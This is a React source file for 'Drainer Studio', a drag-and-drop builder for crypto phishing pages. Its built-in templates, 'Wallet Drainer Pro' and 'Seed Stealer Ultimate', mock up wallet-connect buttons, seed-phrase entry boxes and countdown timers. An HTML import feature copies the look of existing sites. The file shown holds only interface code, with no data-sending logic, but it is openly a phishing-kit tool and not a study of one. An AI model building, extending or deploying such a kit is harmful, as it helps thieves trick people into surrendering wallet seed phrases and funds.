import { useState, useCallback, useRef, useEffect } from 'react';
import { Element, HistoryState, Template } from './types/Element';
import { Sidebar } from './components/Sidebar';
import { Canvas } from './components/Canvas';
import { PropertyPanel } from './components/PropertyPanel';
import { generateHTML, downloadHTML } from './utils/exportHTML';

const createDefaultElement = (type: Element['type'], x: number, y: number): Element => {
  const baseElement = {
    id: `element-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    x,
    y,
    width: 150,
    height: 40,
    text: type.charAt(0).toUpperCase() + type.slice(1),
    color: '#00ffff',
    backgroundColor: '#1a1a2e',
    rotation: 0,
    opacity: 1,
    borderRadius: 4,
    fontSize: 14,
    fontWeight: 'normal',
    borderStyle: 'solid',
    borderColor: '#00ffff',
    borderWidth: 1,
    zIndex: 1,
  };

  switch (type) {
    case 'button':
      return { ...baseElement, width: 120, height: 40, backgroundColor: '#ff00ff', text: 'CONNECT' };
    case 'input':
      return { ...baseElement, width: 200, height: 40, backgroundColor: '#0a0a0a', text: 'Enter address...' };
    case 'text':
      return { ...baseElement, width: 250, height: 30, text: 'Welcome to Drainer Studio', fontSize: 18 };
    case 'image':
      return { ...baseElement, width: 100, height: 100, text: '🖼️ Image' };
    case 'timer':
      return { ...baseElement, width: 150, height: 50, text: '⏱️ 00:59', backgroundColor: '#ff0080' };
    case 'progress':
      return { ...baseElement, width: 200, height: 20, text: 'Loading...', backgroundColor: '#00ff00' };
    case 'qr':
      return { ...baseElement, width: 120, height: 120, text: '📱 QR Code' };
    case 'social':
      return { ...baseElement, width: 180, height: 40, text: '🔗 Connect Social' };
    case 'slider':
      return { ...baseElement, width: 150, height: 40, text: '🎚️ Slider' };
    case 'toggle':
      return { ...baseElement, width: 60, height: 30, text: '🔘' };
    default:
      return baseElement;
  }
};

const templates: Template[] = [
  {
    id: 'wallet-drainer',
    name: 'Wallet Drainer Pro',
    description: 'Professional wallet connection interface',
    elements: [
      { type: 'text', x: 200, y: 50, text: 'Connect Your Wallet', fontSize: 24, color: '#00ffff' },
      { type: 'button', x: 200, y: 150, text: 'METAMASK', backgroundColor: '#ff6b35' },
      { type: 'button', x: 200, y: 200, text: 'WALLETCONNECT', backgroundColor: '#3b99fc' },
      { type: 'input', x: 200, y: 250, text: '0x...', width: 300 },
      { type: 'timer', x: 200, y: 320, text: '⏱️ 02:00' },
    ]
  },
  {
    id: 'seed-stealer',
    name: 'Seed Stealer Ultimate',
    description: 'Seed phrase recovery interface',
    elements: [
      { type: 'text', x: 200, y: 50, text: 'Enter Your Seed Phrase', fontSize: 20, color: '#ff00ff' },
      { type: 'input', x: 200, y: 100, text: 'word1 word2 word3...', width: 350, height: 80 },
      { type: 'button', x: 200, y: 200, text: 'RECOVER WALLET', backgroundColor: '#00ff00' },
      { type: 'progress', x: 200, y: 250, text: 'Scanning...', width: 250 },
      { type: 'qr', x: 400, y: 100 },
    ]
  }
];

export default function App() {
  const [elements, setElements] = useState<Element[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [history, setHistory] = useState<HistoryState[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [zoom, setZoom] = useState(1);
  const [showGrid, setShowGrid] = useState(true);
  const [backgroundImage, setBackgroundImage] = useState<string>('');
  const [draggedType, setDraggedType] = useState<Element['type'] | null>(null);
  const [activeTab, setActiveTab] = useState<'elements' | 'templates' | 'layers' | 'controls'>('elements');
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });

  const canvasRef = useRef<HTMLDivElement>(null);

  const saveToHistory = useCallback(() => {
    const newState: HistoryState = {
      elements: [...elements],
      selectedId,
    };
    
    const newHistory = history.slice(0, historyIndex + 1);
    newHistory.push(newState);
    
    if (newHistory.length > 30) {
      newHistory.shift();
    }
    
    setHistory(newHistory);
    setHistoryIndex(newHistory.length - 1);
  }, [elements, selectedId, history, historyIndex]);

  const updateElement = useCallback((id: string, updates: Partial<Element>) => {
    setElements(prev => prev.map(el => 
      el.id === id ? { ...el, ...updates } : el
    ));
    saveToHistory();
  }, [saveToHistory]);

  const deleteElement = useCallback((id: string) => {
    setElements(prev => prev.filter(el => el.id !== id));
    setSelectedId(null);
    saveToHistory();
  }, [saveToHistory]);

  const handleUndo = useCallback(() => {
    if (historyIndex > 0) {
      const prevState = history[historyIndex - 1];
      setElements(prevState.elements);
      setSelectedId(prevState.selectedId);
      setHistoryIndex(historyIndex - 1);
    }
  }, [history, historyIndex]);

  const handleRedo = useCallback(() => {
    if (historyIndex < history.length - 1) {
      const nextState = history[historyIndex + 1];
      setElements(nextState.elements);
      setSelectedId(nextState.selectedId);
      setHistoryIndex(historyIndex + 1);
    }
  }, [history, historyIndex]);

  const handleDragStart = (type: Element['type']) => {
    setDraggedType(type);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    if (!draggedType || !canvasRef.current) return;

    const rect = canvasRef.current.getBoundingClientRect();
    const x = (e.clientX - rect.left) / zoom;
    const y = (e.clientY - rect.top) / zoom;

    const newElement = createDefaultElement(draggedType, x, y);
    setElements(prev => [...prev, newElement]);
    setSelectedId(newElement.id);
    setDraggedType(null);
    saveToHistory();
  };

  const loadTemplate = (template: Template) => {
    const newElements = template.elements.map((el, index) => ({
      ...createDefaultElement(el.type, el.x, el.y),
      ...el,
      id: `template-${Date.now()}-${index}`,
    }));
    setElements(newElements);
    setSelectedId(null);
    saveToHistory();
  };

  // 🎨 DESIGN-ONLY HTML Import Function
  const handleHTMLImport = useCallback((html: string) => {
    try {
      // Create a temporary DOM element to parse HTML
      const tempDiv = document.createElement('div');
      tempDiv.innerHTML = html;

      const extractedElements: Element[] = [];
      let yOffset = 50;

      // 🎨 Extract ONLY visual text elements (headings, paragraphs)
      const textElements = tempDiv.querySelectorAll('h1, h2, h3, h4, h5, h6, p, div, span');
      textElements.forEach((element, index) => {
        const text = element.textContent?.trim();
        if (text && text.length > 0 && text.length < 150 && !element.querySelector('button, input, a, form')) {
          const computedStyle = window.getComputedStyle(element);
          const tagName = element.tagName.toLowerCase();
          let fontSize = 16;
          
          // Set font sizes based on tag
          switch (tagName) {
            case 'h1': fontSize = 32; break;
            case 'h2': fontSize = 24; break;
            case 'h3': fontSize = 20; break;
            case 'h4': fontSize = 18; break;
            case 'h5': fontSize = 16; break;
            case 'h6': fontSize = 14; break;
            default: fontSize = parseInt(computedStyle.fontSize) || 16;
          }
          
          // Convert colors to hex format
          const color = computedStyle.color;
          const backgroundColor = computedStyle.backgroundColor;
          
          extractedElements.push({
            id: `imported-text-${Date.now()}-${index}`,
            type: 'text',
            x: 200,
            y: yOffset,
            width: 300,
            height: Math.max(30, fontSize + 10),
            text: text,
            color: color || '#00ffff',
            backgroundColor: backgroundColor === 'rgba(0, 0, 0, 0)' ? 'transparent' : backgroundColor,
            rotation: 0,
            opacity: parseFloat(computedStyle.opacity) || 1,
            borderRadius: 0,
            fontSize: fontSize,
            fontWeight: computedStyle.fontWeight || 'normal',
            borderStyle: 'none',
            borderColor: 'transparent',
            borderWidth: 0,
            zIndex: 1,
          });
          yOffset += 50;
        }
      });

      // 🎨 Extract ONLY visual images (no functional elements)
      const images = tempDiv.querySelectorAll('img');
      images.forEach((img, index) => {
        // Skip if image is inside a button, link or form
        const parent = img.closest('button, a, form');
        if (!parent) {
          const rect = img.getBoundingClientRect();
          
          extractedElements.push({
            id: `imported-image-${Date.now()}-${index}`,
            type: 'image',
            x: 200,
            y: yOffset,
            width: Math.max(rect.width, 100),
            height: Math.max(rect.height, 100),
            text: img.alt || '🖼️ Image',
            color: '#ffffff',
            backgroundColor: '#374151',
            rotation: 0,
            opacity: 1,
            borderRadius: 4,
            fontSize: 14,
            fontWeight: 'normal',
            borderStyle: 'solid',
            borderColor: '#00ffff',
            borderWidth: 1,
            zIndex: 1,
          });
          yOffset += 120;
        }
      });

      // 🎨 Extract ONLY decorative buttons (no forms, no links)
      const buttons = tempDiv.querySelectorAll('button');
      buttons.forEach((button, index) => {
        // Skip if button is inside a form
        const parentForm = button.closest('form');
        if (!parentForm) {
          const computedStyle = window.getComputedStyle(button);
          const rect = button.getBoundingClientRect();
          
          extractedElements.push({
            id: `imported-button-${Date.now()}-${index}`,
            type: 'button',
            x: 200,
            y: yOffset,
            width: Math.max(rect.width, 120),
            height: Math.max(rect.height, 40),
            text: button.textContent || 'Button',
            color: computedStyle.color || '#ffffff',
            backgroundColor: computedStyle.backgroundColor || '#ff00ff',
            rotation: 0,
            opacity: parseFloat(computedStyle.opacity) || 1,
            borderRadius: 4,
            fontSize: parseInt(computedStyle.fontSize) || 14,
            fontWeight: computedStyle.fontWeight || 'normal',
            borderStyle: 'solid',
            borderColor: computedStyle.borderColor || '#00ffff',
            borderWidth: parseInt(computedStyle.borderWidth) || 1,
            zIndex: 1,
          });
          yOffset += 60;
        }
      });

      // 🎨 Extract ONLY visual input fields (no forms)
      const inputs = tempDiv.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input[type="search"]');
      inputs.forEach((input, index) => {
        // Skip if input is inside a form
        const parentForm = input.closest('form');
        if (!parentForm) {
          const computedStyle = window.getComputedStyle(input);
          const rect = input.getBoundingClientRect();
          
          extractedElements.push({
            id: `imported-input-${Date.now()}-${index}`,
            type: 'input',
            x: 200,
            y: yOffset,
            width: Math.max(rect.width, 200),
            height: Math.max(rect.height, 40),
            text: input.placeholder || input.value || 'Input field',
            color: computedStyle.color || '#ffffff',
            backgroundColor: computedStyle.backgroundColor || '#0a0a0a',
            rotation: 0,
            opacity: parseFloat(computedStyle.opacity) || 1,
            borderRadius: 4,
            fontSize: parseInt(computedStyle.fontSize) || 14,
            fontWeight: computedStyle.fontWeight || 'normal',
            borderStyle: 'solid',
            borderColor: computedStyle.borderColor || '#00ffff',
            borderWidth: parseInt(computedStyle.borderWidth) || 1,
            zIndex: 1,
          });
          yOffset += 60;
        }
      });

      // 🎨 Extract ONLY decorative divs with background colors or borders
      const decorativeDivs = tempDiv.querySelectorAll('div');
      decorativeDivs.forEach((div, index) => {
        const computedStyle = window.getComputedStyle(div);
        const hasVisualStyle = 
          computedStyle.backgroundColor !== 'rgba(0, 0, 0, 0)' ||
          computedStyle.border !== '0px none rgb(0, 0, 0)' ||
          computedStyle.borderRadius !== '0px';
        
        // Skip if div contains functional elements or is empty
        const hasFunctionalContent = div.querySelector('button, input, a, form, select, textarea');
        const hasText = div.textContent?.trim().length || 0;
        
        if (hasVisualStyle && !hasFunctionalContent && hasText < 50) {
          const rect = div.getBoundingClientRect();
          
          extractedElements.push({
            id: `imported-div-${Date.now()}-${index}`,
            type: 'text',
            x: 200,
            y: yOffset,
            width: Math.max(rect.width, 150),
            height: Math.max(rect.height, 40),
            text: div.textContent?.trim() || 'Decorative Element',
            color: computedStyle.color || '#ffffff',
            backgroundColor: computedStyle.backgroundColor || '#1a1a2e',
            rotation: 0,
            opacity: parseFloat(computedStyle.opacity) || 1,
            borderRadius: parseInt(computedStyle.borderRadius) || 4,
            fontSize: parseInt(computedStyle.fontSize) || 14,
            fontWeight: computedStyle.fontWeight || 'normal',
            borderStyle: 'solid',
            borderColor: computedStyle.borderColor || '#00ffff',
            borderWidth: parseInt(computedStyle.borderWidth) || 1,
            zIndex: 1,
          });
          yOffset += 60;
        }
      });

      if (extractedElements.length > 0) {
        setElements(extractedElements);
        setSelectedId(null);
        saveToHistory();
        console.log(`✅ Imported ${extractedElements.length} design elements from HTML`);
      } else {
        console.log('⚠️ No design elements found in HTML');
      }
    } catch (error) {
      console.error('❌ Error parsing HTML:', error);
    }
  }, [saveToHistory]);

  const handleExport = () => {
    const html = generateHTML(elements, backgroundImage);
    downloadHTML(html);
  };

  const handleCanvasMouseMove = (e: React.MouseEvent) => {
    if (!canvasRef.current) return;
    const rect = canvasRef.current.getBoundingClientRect();
    const x = Math.round(e.clientX - rect.left);
    const y = Math.round(e.clientY - rect.top);
    setMousePos({ x, y });
  };

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.ctrlKey || e.metaKey) {
        if (e.key === 'z' && !e.shiftKey) {
          e.preventDefault();
          handleUndo();
        } else if ((e.key === 'y') || (e.key === 'z' && e.shiftKey)) {
          e.preventDefault();
          handleRedo();
        }
      } else if (e.key === 'Delete' && selectedId) {
        deleteElement(selectedId);
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [selectedId, handleUndo, handleRedo, deleteElement]);

  return (
    <div className="flex h-screen bg-black text-white font-mono overflow-hidden">
      {/* Sidebar */}
      <Sidebar
        activeTab={activeTab}
        setActiveTab={setActiveTab}
        elements={elements}
        selectedId={selectedId}
        setSelectedId={setSelectedId}
        templates={templates}
        loadTemplate={loadTemplate}
        handleDragStart={handleDragStart}
        zoom={zoom}
        setZoom={setZoom}
        showGrid={showGrid}
        setShowGrid={setShowGrid}
        backgroundImage={backgroundImage}
        setBackgroundImage={setBackgroundImage}
        handleUndo={handleUndo}
        handleRedo={handleRedo}
        canUndo={historyIndex > 0}
        canRedo={historyIndex < history.length - 1}
        handleExport={handleExport}
        handleHTMLImport={handleHTMLImport}
      />

      {/* Main Canvas Area */}
      <div className="flex-1 flex flex-col">
        {/* Top Bar */}
        <div className="h-12 bg-gray-900 border-b border-cyan-500/30 flex items-center justify-between px-4">
          <div className="flex items-center space-x-4">
            <h1 className="text-cyan-400 font-bold text-lg">⚡ React Drainer Studio v8.0 Ultimate</h1>
            <div className="text-xs text-gray-400">
              Elements: {elements.length} | Selected: {selectedId ? '✓' : '✗'} | Zoom: {Math.round(zoom * 100)}%
            </div>
          </div>
          <div className="text-xs text-gray-400">
            Mouse: {mousePos.x}, {mousePos.y}
          </div>
        </div>

        {/* Canvas Container */}
        <div className="flex-1 bg-gray-950 relative overflow-hidden">
          <div
            ref={canvasRef}
            className="absolute inset-4 bg-gray-900 rounded-lg border border-cyan-500/20 overflow-hidden"
            style={{
              backgroundImage: backgroundImage ? `url(${backgroundImage})` : showGrid 
                ? 'linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px)'
                : 'none',
              backgroundSize: backgroundImage ? 'cover' : '20px 20px',
              transform: `scale(${zoom})`,
              transformOrigin: 'top left',
              cursor: draggedType ? 'copy' : 'default',
            }}
            onDragOver={handleDragOver}
            onDrop={handleDrop}
            onMouseMove={handleCanvasMouseMove}
          >
            <Canvas
              elements={elements}
              selectedId={selectedId}
              setSelectedId={setSelectedId}
              updateElement={updateElement}
            />
          </div>
        </div>
      </div>

      {/* Property Panel */}
      {selectedId && (
        <PropertyPanel
          element={elements.find(el => el.id === selectedId)!}
          updateElement={updateElement}
          deleteElement={deleteElement}
        />
      )}
    </div>
  );
}